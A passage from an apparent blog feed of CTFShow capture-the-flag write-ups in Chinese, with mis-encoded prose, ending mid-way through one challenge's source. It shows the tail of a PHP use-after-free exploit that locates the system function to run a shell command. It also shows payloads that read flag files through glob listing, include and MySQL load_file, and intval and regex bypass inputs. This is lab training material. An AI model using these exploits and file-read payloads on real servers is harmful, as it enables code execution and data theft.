class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = leak(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = leak(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> leak(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> Vuln();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    trigger_uaf(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> Helper;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$abc</span>) == <span class="number">79</span> || strlen(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = leak(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = get_binary_base(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = parse_elf(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = get_basic_funcs(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = get_system(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, leak(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctfshow(<span class="string">&quot;cat /flag0.txt&quot;</span>);ob_end_flush();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æŠŠè¿™ä¸ªè„šæœ¬ URL ç¼–ç :</p>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web72.png"></p>
<h2 id="web73â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web73â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web73â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web73â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p>ä¸ä¸Šä¸€é¢˜ç±»ä¼¼: åˆ©ç”¨ glob:///* æ‰«ææ ¹ç›®å½•ä¸‹æ–‡ä»¶ : flagc.txt</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;  &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>

<p>ç„¶å:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flagc.txt&#x27;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>

<p>å³å¯å¾—åˆ° flag</p>
<h2 id="web74â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web74â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web74â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web74â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p><strong>åŒä¸Š</strong></p>
<h2 id="web75â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web75â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web75â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web75â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p>é¦–å…ˆæ‰«æ ¹ç›®å½•ï¼š å¾—åˆ° flag36.txt</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;  &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>

<p>éªšå§¿åŠ¿åˆ©ç”¨ MySQL load_file() æ¥è¯»å–æ–‡ä»¶; ğŸ‚ğŸº</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$conn</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$conn</span>-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$conn</span> = <span class="literal">null</span>;</span><br><span class="line">&#125;<span class="keyword">catch</span> (PDOException <span class="variable">$e</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web75.png"></p>
<h2 id="web76â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web76â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web76â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web76â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p><strong>åŒä¸Š</strong></p>
<h2 id="web77â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”-FFI"><a href="#web77â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”-FFI" class="headerlink" title="web77â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€” FFI"></a>web77â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€” FFI</h2><p>ä¸ä¼š</p>
]]></content>
      <categories>
        <category>CTFç¬”è®°</category>
      </categories>
  </entry>
  <entry>
    <title>CTFShow PHPç‰¹æ€§</title>
    <url>/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<h1 id="CTFShow-PHP-ç‰¹æ€§"><a href="#CTFShow-PHP-ç‰¹æ€§" class="headerlink" title="CTFShow PHP ç‰¹æ€§"></a>CTFShow PHP ç‰¹æ€§</h1><h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><p>æºç :</p>
<span id="more"></span>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 15:38:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ol>
<li>æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼š æ•°å­— 0-9ï¼Œ å°±ä¼š ç‹—å¸¦ no no no </li>
<li>intval() å‡½æ•°ï¼šè·å–å˜é‡çš„æ•´æ•°å€¼</li>
</ol>
<p><strong>å®éªŒï¼š</strong></p>
<ol>
<li>æ•°ç»„ç»•è¿‡ : ?num[]</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web89.png"></p>
<h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 16:06:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>intval($num,0) ç¬¬äºŒä½å‚æ•°ä¸º 0</p>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web90.png"></p>
<p>iintval() è·å–å˜é‡çš„æ•´æ•°å€¼:</p>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web90_1.png"></p>
<p>ä»è¿™å¯ä»¥çœ‹å‡ºï¼Œæ•´ä¸ªå‡½æ•°åªè¯»å–äº†ä¼ å…¥çš„å­—ç¬¦ä¸²ä¸­çš„æ•°å­—éƒ¨åˆ†ä¸”åªå–å­—æ¯å‰é¢</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?num=<span class="number">4476</span>a</span><br></pre></td></tr></table></figure>

<p>å°† num==4476a ä¼ å…¥å°†å¾—åˆ° 4476 é‚£ä¹ˆ if(intval($num,0) === 4476) æˆç«‹ å³å¯è·å¾—flag</p>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web90_2.png"></p>
<h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Firebasky</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-18 16:16:09</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">$a=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;</span><br><span class="line">    if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;</span><br><span class="line">        echo &#x27;hacker&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &#x27;nonononono&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: cmd in /var/www/html/index.php on line 15</span><br><span class="line">nonononono</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ol>
<li><p>æ­£åˆ™è¡¨è¾¾å¼ : /^php$/im:</p>
<p>^  : åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®</p>
<p>$  : åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„ç»“å°¾ä½ç½®</p>
<p>i   : ä¸åŒºåˆ†å¤§å°å†™</p>
<p>m : å¤šè¡ŒåŒ¹é… ä½¿è¾¹ç•Œå­—ç¬¦ <strong>^</strong> å’Œ <strong>$</strong> åŒ¹é…æ¯ä¸€è¡Œçš„å¼€å¤´å’Œç»“å°¾</p>
<p>é‚£ä¹ˆè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ ï¼Œè¾“å…¥çš„å­—ç¬¦ä¸²ä¸º php æ‰ä¸ºçœŸæ‰èƒ½è¿›å…¥æ­¤ if ä¸­</p>
</li>
<li><p>æ­£åˆ™è¡¨ç¤º /^php$/i: ä¸ä¸Šä¸€ä¸ªæ­£åˆ™ç›¸æ¯” å°‘äº† å¤šè¡ŒåŒ¹é…ã€‚ é‚£ä¹ˆçªå…¥ç‚¹å°±åœ¨ è¿™ä¸ª må¤šåŒ¹é…ä¸Šé¢ã€‚</p>
</li>
<li><p>ç¬¬äºŒä¸ª if è¯­å¥ä¸èƒ½æ»¡è¶³æ‰èƒ½å¾—åˆ° flag æ„æ€å°±æ˜¯ ç¬¬äºŒä¸ª if å®ƒä¸èƒ½åŒ¹é…åˆ°å­—ç¬¦ä¸² php </p>
</li>
<li><p>ç¬¬ä¸€ä¸ª if è¯­å¥å¤šè¡ŒåŒ¹é…åˆ°å­—ç¬¦ä¸² php</p>
</li>
<li><p>å› æ­¤å¾—è®©ç¬¬ä¸€ä¸ªå¤šè¡ŒåŒ¹é…èƒ½åŒ¹é…åˆ°å­—ç¬¦ä¸² php è€Œ ç¬¬äºŒä¸ªå•è¡ŒåŒ¹é…ä¸èƒ½åŒ¹é…åˆ°å­—ç¬¦ä¸² php å°±å¾—è®©å­—ç¬¦ä¸²ç¬¬ä¸€è¡Œä¸ä¸º php ç¬¬äºŒè¡Œæˆ–è€…ç¬¬ä¸‰è¡Œâ€¦â€¦ ä¸ºphp </p>
</li>
<li><p>æ„å»º playload notphpæ¢è¡Œphp â€“ &gt; notphp%0a123%0aphp (ä¸€å…±ä¸‰è¡Œ %0a ä¸ºæ¢è¡Œç¬¦çš„ URLç¼–ç )</p>
</li>
</ol>
<p><strong>å®éªŒï¼š</strong></p>
<ol>
<li>ç›´æ¥è¾“å…¥ php æ•ˆæœ:</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web91.png"></p>
<ol start="2">
<li>notphp%0a123%0aphp</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web91_1.png"></p>
<h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 16:29:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ol>
<li>intval() è·å–å˜é‡çš„æ•´æ•°å€¼ï¼Œ<strong>intval</strong>    ( <a href="mk:@MSITStore:D:\MY-CODE\PHP\php7.3.8æ‰‹å†Œï¼ˆå®˜ç½‘ï¼‰\php7.3.8æ‰‹å†Œï¼ˆå®˜ç½‘ï¼‰\php7.3.8ï¼ˆå®˜ç½‘ä¸‹è½½ï¼‰.chm::/res/language.pseudo-types.html#language.types.mixed">mixed</a> <code>$var</code>   [, int <code>$base</code> = 10  ] ) : int</li>
<li>ä½¿ç”¨æŒ‡å®šè¿›åˆ¶ base è½¬æ¢(é»˜è®¤åè¿›åˆ¶) baseæ˜¯ 0 ï¼Œæ£€æµ‹ var çš„æ ¼å¼æ¥å†³å®šä½¿ç”¨çš„è¿›åˆ¶:</li>
</ol>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web92.png"></p>
<ol start="3">
<li>if(intval($num,0)==4476){echo $flag;} æ­¤å¤„ == ä¸ºå¼±æ¯”è¾ƒï¼Œåªæ¯”è¾ƒæ•°å€¼ï¼Œä¸æ¯”è¾ƒç±»å‹ï¼Œé‚£ä¹ˆå°† 4476 è½¬æ¢ä¸ºå…«è¿›åˆ¶(010574)æˆ–åå…­è¿›åˆ¶(0x117c)ï¼Œå°±èƒ½ä½¿æ¯”è¾ƒæˆç«‹å¹¶å¾—åˆ° flag</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?num=<span class="number">0x117c</span></span><br><span class="line">?num=<span class="number">010574</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web92_1.png"></p>
<h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Firebasky</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-18 16:32:58</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num==4476)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)==4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo intval($num,0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ol>
<li>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸€é¢˜ å¤šäº†æ­£åˆ™åŒ¹é…äº† <strong>å­—æ¯</strong>ï¼Œ é‚£ä¹ˆå…­è¿›åˆ¶ 0x å°†å¤±æ•ˆ</li>
<li>å…«è¿›åˆ¶(010574)</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?num=<span class="number">010574</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web93.png"></p>
<h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-18 16:46:19</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num===&quot;4476&quot;)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!strpos($num, &quot;0&quot;))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    